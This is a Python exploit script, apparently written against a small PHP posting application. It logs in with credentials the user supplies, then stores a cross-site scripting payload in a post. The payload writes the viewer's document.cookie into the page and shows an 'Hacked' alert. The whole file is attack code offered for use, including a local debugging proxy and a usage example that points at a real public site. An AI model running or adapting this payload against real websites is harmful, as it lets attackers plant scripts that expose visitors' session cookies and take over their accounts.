import requests
import sys
import urllib3
import html

proxies = {'http':'http://127.0.0.1:8080','https': 'https://127.0.0.1:8080/'} #debug


def printhelp(name):
    print("Storing malicious script into database:")
    print("[-] Usage: %s <url>" %name)
    print("""[-] Example: %s "https://www.google.com" """ %name)

def login(s,username,password):
    data = {"username":username, "password": password, "submit":""}
    path = "/procedure/loginproc.php"
    r = s.post(url + path,data = data,verify = False)
    if "Hello" in r.text:
        return True
    else:
        return False

def exploit_stored_XSS(s,url):
    path = "/procedure/post.php"
    data = {"title":"No title", "post":r'<p id="xss"></p><script>document.getElementById("xss").innerHTML = document.cookie;alert("Hacked");</script>', "submit":""}
    r = s.post(url+path,data = data,verify = False)
    if "CLICK" in r.text:
        return True
    else:
        return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        printhelp(sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    username = input("[+] Username: ")
    password = input("[+] Password: ")
    if not login(s,username,password):
        print("[+] Login unsuccesful!")
        sys.exit(-1)
    else:
        print("[+] Login successful!")
    print("[+] Injecting script into %s profile..."%username)
    if (exploit_stored_XSS(s,url)):
        print("[+] Stored XSS successful!")
    else:
        print("[+] Stored XSS unsuccesful!")